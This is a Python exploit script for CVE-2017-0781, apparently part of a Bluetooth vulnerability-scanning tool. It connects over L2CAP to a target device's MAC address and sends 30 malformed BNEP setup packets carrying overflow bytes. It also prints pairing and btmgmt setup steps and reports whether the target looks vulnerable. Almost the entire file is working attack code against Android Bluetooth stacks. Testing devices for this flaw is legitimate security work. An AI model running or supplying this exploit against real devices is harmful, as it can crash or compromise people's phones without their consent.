from pwn import *
import bluetooth
import logging
import argparse
import sys
from sbleedyCLI.report import report_vulnerable, report_not_vulnerable, report_error
from sbleedyCLI.constants import LOG_FILE

count = 30 # Amount of packets to send
port = 0xf # BT_PSM_BNEP
context.arch = 'arm'
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01

def set_bnep_header_extension_bit(bnep_header_type):
    """
    If the extension flag is equal to 0x1 then
    one or more extension headers follows the BNEP
    header; If extension flag is equal to 0x0 then the
    BNEP payload follows the BNEP header.
    """
    return bnep_header_type | 128

def bnep_control_packet(control_type, control_packet):
    return p8(control_type) + control_packet

def packet(overflow):
    pkt = b''
    pkt += p8(set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
    pkt += bnep_control_packet(BNEP_SETUP_CONNECTION_REQUEST_MSG, b'\x00' + overflow)
    return pkt

def run_exploit(target):
    bad_packet = packet(b'AAAABBBB')

    print('Connecting...')
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, 1500)
    sock.connect((target, port))

    print('Sending BNEP packets...')
    for i in range(count):
        sock.send(bad_packet)

    print('Done.')
    sock.close()

if __name__ == '__main__':
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO)
    parser = argparse.ArgumentParser(description="CVE-2017-0781 Args")
    parser.add_argument('--target', type=str, help='Target MAC address')
    args = parser.parse_args()
    if not args.target:
        logging.error("Wrong Usage Error: CVE-2017-0781.py --target XX:XX:XX:XX:XX:XX")
        report_error("Wrong usage of CVE-2017-0781.py")
        exit()

    print("[i] CVE-2017-0781: For this exploit to run successfully you have to do the following first: \nChange the IO capabilities of your controller with 'sudo btmgmt io-cap 0x01'\nPair with your target device using bluetoothctl\nChange the IO capabilities with 'sudo btmgmt io-cap 0x03'\nThen run this script. For more info refer to https://github.com/ojasookert/CVE-2017-0781\n")
    sys.stdout.flush()
    try:
        run_exploit(args.target)
    except Exception as e:
        if str(e) == "Invalid continuation state received.":
            report_not_vulnerable("Target device OS is not Android")
        elif "Host is down" in str(e):
            report_not_vulnerable("Couln't connect, host is down")
        else:
            report_error(str(e))